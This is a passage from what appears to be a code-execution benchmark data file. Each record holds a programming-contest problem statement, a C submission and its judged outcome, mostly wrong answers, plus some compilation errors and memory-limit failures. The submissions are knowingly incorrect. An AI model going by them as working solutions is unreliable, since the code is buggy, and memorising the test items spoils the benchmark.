is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":1400,"lang":"GNU C","lang_cluster":"c","src_uid":"9c30697e71102ae10c55c14d9c1db006","submission_id":"re_969","tags":["dp","implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<string.h>\n\nint main(void){\n  char str[524288];\n  int i,j,k,l;\n  int length,check,flg=0;\n  fgets(str,sizeof(str)\/sizeof(char),stdin);\n  \n  l=strlen(str);\n  str[l-1]='\\0';\n  l=strlen(str);\n  check=0;\n  if(str[0]=='.'){\n    puts(\"NO\");\n    return 0;\n  }\n\n  for(i=0;i<l;i++){\n    ++check;\n    if(str[i]=='.'){\n      if(check<=-2){\n\tputs(\"NO\");\n\treturn 0;\n      }\n      check=-3;\n    }\n    if(check>8){\n      puts(\"NO\");\n      return 0;\n    }\n  }\n  if(check>0){\n    puts(\"NO\");\n    return 0;\n  }\n  puts(\"YES\");\n  \n  for(i=0;i<l;i+=j+flg+1){\n    for(j=0;str[i+j]!='.';j++) putchar(str[i+j]);\n    putchar('.');\n    for(k=j+1;str[i+k]!='.';k++){\n      if(str[i+k]=='\\0'){\n\tfor(check=i+j+1;check<l;check++) putchar(str[check]);\n\tputchar('\\n');\n\treturn 0;\n      }\n    }\n    length=k;\n    if(length==2) flg=1;\n    else if(length==3) flg=2;\n    else flg=3;\n    for(k=0;k<flg;k++) putchar(str[i+j+k+1]);\n    putchar('\\n');\n  }\n  return 0;\n}\n\n","description":"Eudokimus, a system administrator is in trouble again. As a result of an error in some script, a list of names of very important files has been damaged. Since they were files in the BerFS file system, it is known that each file name has a form \"name.ext\", where:   name is a string consisting of lowercase Latin letters, its length is from 1 to 8 characters;  ext is a string consisting of lowercase Latin letters, its length is from 1 to 3 characters. For example, \"read.me\", \"example.txt\" and \"b.cpp\" are valid file names and \"version.info\", \"ntldr\" and \"contestdata.zip\" are not.Damage to the list meant that all the file names were recorded one after another, without any separators. So now Eudokimus has a single string.Eudokimus needs to set everything right as soon as possible. He should divide the resulting string into parts so that each part would be a valid file name in BerFS. Since Eudokimus has already proved that he is not good at programming, help him. The resulting file list can contain the same file names.","input_from":"standard input","output_to":"standard output","input_spec":"The input data consists of a single string s, its length is from 1 to 4\u00b7105 characters. The string can contain only lowercase Latin letters ('a' - 'z') and periods ('.').","output_spec":"In the first line print \"YES\" (without the quotes), if it is possible to divide s into parts as required. In this case, the following lines should contain the parts of the required partition, one per line in the order in which they appear in s. The required partition can contain the same file names. If there are multiple solutions, print any of them. If the solution does not exist, then print in a single line \"NO\" (without the quotes).","notes":null,"sample_inputs":["read.meexample.txtb.cpp","version.infontldrcontestdata.zip"],"sample_outputs":["YES\nread.m\neexample.t\nxtb.cpp","NO"]}
{"difficulty":1100,"lang":"GNU C","lang_cluster":"c","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_805","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\nint main()\n{\n\n    int n,m;\n    scanf(\"%d %d\",&n,&m);\n    char words[n][m];\n    int bools[n][m];\n    int i=0,j=0;\n    for(i=0;i<n;i++)\n    {\n        bools[i][j]=0;\n        getchar();\n        for(j=0;j<m;j++)\n        {\n            scanf(\"%c\",&words[i][j]);\n\n        }\n    }\n\n    for(i=0;i<n;i++)\n    {\n        for(j=0;j<m;j++)\n        {\n            int flag=0;\n            if(bools[i][j]==1)\n                continue;\n            char z=words[i][j];\n            int c=0;\n            for(c=0;c<n||c<m;c++)\n            {\n                if(c<n&&words[c][j]==z&&c!=i)\n                {\n                    bools[c][j]=1;\n                    flag=1;\n                }\n                if(c<m&&words[i][c]==z&&c!=j)\n                {\n                    bools[i][c]=1;\n                    flag=1;\n                }\n            }\n            if(!flag)\n                printf(\"%c\",z);\n        }\n    }\n    return 0;\n}\n","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":1400,"lang":"GNU C","lang_cluster":"c","src_uid":"a37df9b239a40473516d1525d56a0da7","submission_id":"re_348","tags":["combinatorics"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\n#include <stdlib.h>\n\nint main(void)\n{\n    char buf = '\\0';\n    unsigned long int result = 0;\n    unsigned long int variants = 0;\n    int symbols[100][26] = {{0}};\n\/\/    FILE *f = 0;\n    int N = 0,M = 0,n=0,m=0,i=0;\n\n\/\/    f = fopen(\"input.txt\",\"rt\");\n\n    scanf(\"%d %d\\n\",&N,&M);\n\n    for (n=0;n<N;n++) {\n        for (m=0;m<M;m++) {\n            buf = getc(stdin);\n            symbols[m][buf-'A'] = 1;\n        }\n        getc(stdin);\n    }\n\n    result = 1;\n    for (m=0;m<M;m++) {\n        variants = 0;\n        for (i=0;i<26;i++) {\n            variants += symbols[m][i];\n        }\n        result *= variants;\n        result %= 1000000007;\n    }\n    printf(\"%li\",result);\n\n\n\n\n    return 0;\n}\n","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":1100,"lang":"GNU C11","lang_cluster":"c","src_uid":"b1ef19d7027dc82d76859d64a6f43439","submission_id":"re_688","tags":["implementation","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include <stdio.h>\n#include <string.h>\n\nint main(){\n\tchar s[1000], t[1000];\n\tscanf (\"%[^\\n]\", s);\n\tgetchar();\n\t\n\tscanf (\"%[^\\n]\", t);\n\tgetchar();\n\t\n\tint len = strlen(s);\n\tint les = strlen(t);\n\t\n\tint ts[200] = {};\n\t\n\tfor (int i=0; i<len; i++){\n\t\tts[s[i]]++;\n\t}\n\t\n\tbool found = true;\n\tfor (int i=0; i<les && found; i++){\n\t\tif (t[i] != ' '){\n\t\t\tif (ts[t[i]] > 0) ts[t[i]]--;\n\t\t\telse found = false;\n\t\t}\n\t}\n\t\n\tprintf (\"%s\", (found) ? \"YES\", \"NO\");\n}\n","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears","abcdefg hijk\nk j i h g f e d c b a"],"sample_outputs":["NO","YES","NO","YES"]}
{"difficulty":1000,"lang":"GNU C","lang_cluster":"c","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_710","tags":["implementation","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<string.h>\nint main()\n{\n\tchar s[1001];\n\tint i,k,count=0,j;\n\t scanf(\"%s\",&s);\n\t scanf(\"%d\",&k);\n\tif(strlen(s) <k)\n\tprintf(\"impossible\");\n\telse\n    {\n      for(i=0;i<=strlen(s);i++)\n            for(j=i+1;j<=strlen(s);j++)\n             if(s[i]==s[j])\n                count++;\n\n      if(i== strlen(s))\n        printf(\"impossible\");\n        else\n        printf(\"%d\",count);\n\n    }\n}\n","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1000,"lang":"GNU C11","lang_cluster":"c","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_381","tags":["greedy"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include<stdio.h>\nmain()\n{\n    int n,p=0,i,j;\n    scanf(\"%d\",&n);\n    int a[n],h[10000]={0};\n    for(i=0;i<n;i++)\n    {   scanf(\"%d\",&a[i]);\n        \n        h[a[i]]++;\n    }\n   for(j=0;j<=n;j++)\n   {\n       if(h[j]>1)\n     p=p+h[j]-1; \n       \n   }\n   printf(\"%d\",p);\n}\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"GNU C11","lang_cluster":"c","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_665","tags":["strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    char v[100000], a1[100], a2[100], nv[100000];\n    scanf(\"%s\", &v);\n    strcpy(nv, v);\n    strrev(nv);\n    scanf(\"%s\", &a1);\n    scanf(\"%s\", &a2);\n    if(strstr(v, a1) != NULL && strstr(v, a2) != NULL && strlen(v)>=(strlen(a1)+strlen(a2))){\n        if(strstr(v, a1)>=strstr(v,a2) && strstr(nv, a1)>=strstr(nv, a2))\n            printf(\"both\");\n        else if(strstr(v, a1)>strstr(v,a2))\n            printf(\"backward\");\n        else if(strstr(v, a1)<strstr(v,a2))\n            printf(\"forward\");\n        else printf(\"fantasy\");\n    }\n    else printf(\"fantasy\");\n    return 0;\n}","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1100,"lang":"GNU C","lang_cluster":"c","src_uid":"d526af933b5afe9abfdf9815e9664144","submission_id":"re_793","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\nint main ()\n{\n    int n,i,j,num[2000],a[2000],min=2000,x,z;\n    scanf(\"%d\",&n);\n    for(i=1;i<=n;i++)\n    {\n        scanf(\"%d\",&num[i]);\n        if(num[i]<min)\n            {\n                min=num[i];\n                z=i;\n            }\n    }\n    if(z==1 || z==n)\n    {\n        printf(\"%d\\n\",min);\n        return 0;\n    }\n    \/\/printf(\"%d\\n\",min);\n    min=2000,i=1;\n    while(i<n)\n    {\n        if(num[i+1]>num[i+2])\n        {\n            if(min>num[i+1])\n            {\n                min=num[i+1];\n            }\n            i=i+1;\n        }\n        else{\n\n            if(min>num[i+2])\n            {\n                min=num[i+2];\n            }\n            i=i+2;\n        }\n    }\n\n    printf(\"%d\\n\",min);\n    return 0;\n}\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i\u2009&lt;\u2009n\u2009-\u20091), you can reach the tiles number i\u2009+\u20091 or the tile number i\u2009+\u20092 from it (if you stand on the tile number n\u2009-\u20091, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai\u2009+\u20091 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103) \u2014 the boulevard's length in tiles. The second line contains n space-separated integers ai \u2014 the number of days after which the i-th tile gets destroyed (1\u2009\u2264\u2009ai\u2009\u2264\u2009103). ","output_spec":"Print a single number \u2014 the sought number of days.","notes":"NoteIn the first sample the second tile gets destroyed after day three, and the only path left is 1\u2009\u2192\u20093\u2009\u2192\u20094. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.In the second sample path 1\u2009\u2192\u20093\u2009\u2192\u20095 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.","sample_inputs":["4\n10 3 5 10","5\n10 2 8 3 5"],"sample_outputs":["5","5"]}
{"difficulty":1200,"lang":"GNU C11","lang_cluster":"c","src_uid":"f8315dc903b0542c453cab4577bcb20d","submission_id":"re_893","tags":["implementation","dfs and similar","brute force","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <stdio.h>\nint main()\n{\n     int n,m;\n     scanf(\"%d %d\",&n,&m);\n     int i,j,k,l,o,p;\n     int a[m],b[m],c[2*m];\n     int t=1;\n     for(i=1;i<=m;i++)\n     {\n          scanf(\"%d %d\",&a[i],&b[i]);\n          c[t]=a[i];\n          c[t+1]=b[i];\n          t+=2;\n     }\n     k=0,p=0;\n     int u=1;\n     for(i=1;i<=m;i++)\n     {l=0;\n          for(j=1;j<=m;j++)\n          {\n               if(j!=i)\n               {\n                    if(a[i]!=b[j])\n                    {\n                       l++;\n                    }\n               }\n               if(i==m)\n               {\n                    if(b[m]==a[j])\n                    {\n                    u=0;break;\n                    }\n               }\n               \n          }\n          if(l==m-1)\n          {\n               a[i]=0;\n               b[i]=0;\n               p++;\n          }\n          else \n          k++;\n     }\n     o=n-p-k+u;\n     printf(\"%d\",o);\n}","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n,\u2009a\u2009\u2260\u2009b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.","notes":"NoteIn the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.In the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.In the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.","sample_inputs":["3 3\n1 2\n2 3\n3 1","6 3\n1 2\n2 3\n3 4","6 5\n1 4\n2 4\n3 4\n5 4\n6 4"],"sample_outputs":["0","2","1"]}
{"difficulty":800,"lang":"GNU C11","lang_cluster":"c","src_uid":"facd9cd4fc1e53f50a1e6f947d78e942","submission_id":"re_958","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<math.h>\nint main()\n{\n    int n,i,j,k,a,b,min,t;\n    scanf(\"%d\", &n);\n    int ara[n];\n\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\", &ara[i]);\n    }\n    min = abs(ara[0]-ara[1]);\n    a=1,b=2;\n    for(i=0;i<n;i++)\n    {\n        for(j=i+1,k=1;k<n;j++,k++)\n        {\n            if(j==n)\n                j=0;\n            t = abs(ara[i]-ara[j]);\n            if(t<min)\n            {\n                min = t;\n                a=i+1;\n                b=j+1;\n            }\n        }\n    }\n    printf(\"%d %d\\n\", a, b);\n}\n","description":"n soldiers stand in a circle. For each soldier his height ai is known. A reconnaissance unit can be made of such two neighbouring soldiers, whose heights difference is minimal, i.e. |ai\u2009-\u2009aj| is minimal. So each of them will be less noticeable with the other. Output any pair of soldiers that can form a reconnaissance unit.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of soldiers. Then follow the heights of the soldiers in their order in the circle \u2014 n space-separated integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u20091000). The soldier heights are given in clockwise or counterclockwise direction.","output_spec":"Output two integers \u2014 indexes of neighbouring soldiers, who should form a reconnaissance unit. If there are many optimum solutions, output any of them. Remember, that the soldiers stand in a circle.","notes":null,"sample_inputs":["5\n10 12 13 15 10","4\n10 20 30 40"],"sample_outputs":["5 1","1 2"]}
{"difficulty":2100,"lang":"GNU C","lang_cluster":"c","src_uid":"05f251de93536024c05fbd77ed01b70b","submission_id":"re_1011","tags":["dsu","number theory","dfs and similar","graphs"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include <stdio.h>\n\nint f[4000001];\n\nint getf(int now)\n{\n   if (f[now]==now)\n      return now;\n   return f[now]=getf(f[now]);\n}\n\nint main()\n{\n   int i,n,m,s=0;\n   scanf(\"%d%d\",&n,&m);\n   for (i=1;i<=2*n+2*m;i++)\n      f[i]=i;\n   for (i=1;i<=n;i++)\n      if (i<=m)\n         f[getf(i)]=getf(2*n+i);\n      else\n         f[getf(i)]=getf(n+i-m+1);\n   for (i=1;i<=m;i++)\n      if (m-i+1<=n)\n         f[getf(2*n+i)]=getf(n+m-i+1);\n      else\n         f[getf(2*n+i)]=getf(3*n+m+i-1);\n   for (i=1;i<=n;i++)\n   {\n      if (n-i+1<=m)\n         f[getf(n+i)]=getf(n+2*m+i);\n      if (i<=m)\n         f[getf(n+i)]=getf(i-m+1);\n   }\n   for (i=1;i<=m;i++)\n   {\n      if (i<=n)\n         f[getf(2*n+m+i)]=getf(n-i+1);\n      if (i+n-1<=m)\n         f[getf(2*n+m+i)]=getf(2*n+i+n-1);\n   }\n   for (i=1;i<=2*n+2*m;i++)\n      s+=(f[i]==i);\n   printf(\"%d\\n\",s);\n   return 0;\n}\n","description":"Let's imagine: there is a chess piece billiard ball. Its movements resemble the ones of a bishop chess piece. The only difference is that when a billiard ball hits the board's border, it can reflect from it and continue moving.More formally, first one of four diagonal directions is chosen and the billiard ball moves in that direction. When it reaches the square located on the board's edge, the billiard ball reflects from it; it changes the direction of its movement by 90 degrees and continues moving. Specifically, having reached a corner square, the billiard ball is reflected twice and starts to move the opposite way. While it moves, the billiard ball can make an infinite number of reflections. At any square of its trajectory the billiard ball can stop and on that the move is considered completed.  It is considered that one billiard ball a beats another billiard ball b if a can reach a point where b is located.You are suggested to find the maximal number of billiard balls, that pairwise do not beat each other and that can be positioned on a chessboard n\u2009\u00d7\u2009m in size.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (2\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009106).","output_spec":"Print a single number, the maximum possible number of billiard balls that do not pairwise beat each other. Please do not use the %lld specificator to read or write 64-bit numbers in C++. It is preferred to use cin (also you may use the %I64d specificator).","notes":null,"sample_inputs":["3 4","3 3"],"sample_outputs":["2","3"]}
{"difficulty":2400,"lang":"GNU C","lang_cluster":"c","src_uid":"1d73b315694f2ebbf796654193372730","submission_id":"re_1347","tags":["graphs","greedy","shortest paths"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\n#include<stdlib.h>\n#include<math.h>\n#define REP(i,a,b) for(i=a;i<b;i++)\n#define rep(i,n) REP(i,0,n)\n\nchar mp[66][66];\nint x,y,z;\n\nint sz, arr[15000][4];\nint now_gen[4];\n\nint res[5000], res_size;\nint tmp[5000], tmp_size;\n\nvoid gen(int depth, int st){\n  int i;\n\n  if(depth==z){\n    rep(i,z) arr[sz][i] = now_gen[i];\n    sz++;\n    return;\n  }\n\n  REP(i,st,26){\n    now_gen[depth] = i;\n    gen(depth+1, i+1);\n  }\n}\n\nint smaller(void){\n  int i;\n  rep(i,res_size){\n    if(res[i] < tmp[i]) return 0;\n    if(res[i] > tmp[i]) return 1;\n  }\n  return 0;\n}\n\nvoid renew(void){\n  int i;\n\n  if(res_size == tmp_size && smaller()) res_size++;\n  if(res_size > tmp_size){\n    res_size = tmp_size;\n    rep(i,res_size) res[i] = tmp[i];\n  }\n}\n\nint main(){\n  int i,j,k,l,m,n,loop,mi;\n  int sx,sy,ex,ey,tx,ty,nx,ny;\n  int dx[4]={-1,1,0,0}, dy[4]={0,0,1,-1};\n  int usa[30];\n  int dist[55][55], chked[55][55];\n  int q[3333], q_st, q_size;\n  int ok1[3333], ok2[3333], ok1_size, ok2_size;\n\n  while(scanf(\"%d%d%d\",&x,&y,&z)==3){\n    rep(i,x) scanf(\"%s\",mp[i]);\n\n    sz = 0;\n    gen(0, 0);\n\n    rep(i,x) rep(j,y){\n      if(mp[i][j]=='S'){ mp[i][j] = 27; sx = i; sy = j; continue; }\n      if(mp[i][j]=='T'){ mp[i][j] = 28; ex = i; ey = j; continue; }\n      mp[i][j] -= 'a';\n    }\n\n    res_size = 5000;\n\n    rep(loop,sz){\n      rep(i,30) usa[i] = 0;\n      rep(i,z) usa[arr[loop][i]]=1; usa[28]=1;\n\n      rep(i,x) rep(j,y) dist[i][j] = -1;\n      dist[sx][sy] = 0;\n\n      q_st = 0; q_size = 1;\n      q[0] = sx*y + sy;\n      \n      while(q_size){\n        tx = q[q_st]\/y; ty = q[q_st]%y;\n        q_st++; q_size--;\n\n        rep(k,4){\n          nx = tx + dx[k]; ny = ty + dy[k];\n          if(nx<0||ny<0 || nx>=x||ny>=y) continue;\n          if(!usa[mp[nx][ny]]) continue;\n          if(dist[nx][ny]>=0) continue;\n\n          dist[nx][ny] = dist[tx][ty] + 1;\n          q[q_st+q_size++] = nx*y + ny;\n        }\n      }\n\n      if(dist[ex][ey]==-1) continue;\n      if(dist[ex][ey]-1 > res_size) continue;\n\n      rep(i,x) rep(j,y) chked[i][j] = 0;\n      chked[sx][sy] = 1;\n\n      tmp_size = 0;\n      ok1_size = 1; ok1[0] = sx*y + sy;\n      while(tmp_size < dist[ex][ey]-1){\n        mi = 100;\n        rep(i,ok1_size){\n          tx = ok1[i]\/y; ty = ok1[i]%y;\n          rep(k,4){\n            nx = tx + dx[k]; ny = ty + dy[k];\n            if(nx<0||ny<0 || nx>=x||ny>=y) continue;\n            if(dist[nx][ny] != dist[tx][ty]+1) continue;\n            if(mi > mp[nx][ny]) mi = mp[nx][ny];\n          }\n        }\n\n        ok2_size = 0;\n        rep(i,ok1_size){\n          tx = ok1[i]\/y; ty = ok1[i]%y;\n          rep(k,4){\n            nx = tx + dx[k]; ny = ty + dy[k];\n            if(nx<0||ny<0 || nx>=x||ny>=y) continue;\n            if(dist[nx][ny] != dist[tx][ty]+1) continue;\n            if(chked[nx][ny]) continue;\n            if(mi == mp[nx][ny]){\n              ok2[ok2_size++] = nx*y + ny;\n              chked[nx][ny]=1;\n            }\n          }\n        }\n\n        ok1_size = ok2_size;\n        rep(i,ok1_size) ok1[i] = ok2[i];\n\n        tmp[tmp_size++] = mi;\n      }\n\n      renew();\n    }\n\n    if(res_size==5000){puts(\"-1\"); continue;}\n    rep(i,res_size) putchar('a' + res[i]); puts(\"\");\n  }\n\n  return 0;\n}\n","description":"You already know that Valery's favorite sport is biathlon. Due to your help, he learned to shoot without missing, and his skills are unmatched at the shooting range. But now a smaller task is to be performed, he should learn to complete the path fastest.The track's map is represented by a rectangle n\u2009\u00d7\u2009m in size divided into squares. Each square is marked with a lowercase Latin letter (which means the type of the plot), with the exception of the starting square (it is marked with a capital Latin letters S) and the terminating square (it is marked with a capital Latin letter T). The time of movement from one square to another is equal to 1 minute. The time of movement within the cell can be neglected. We can move from the 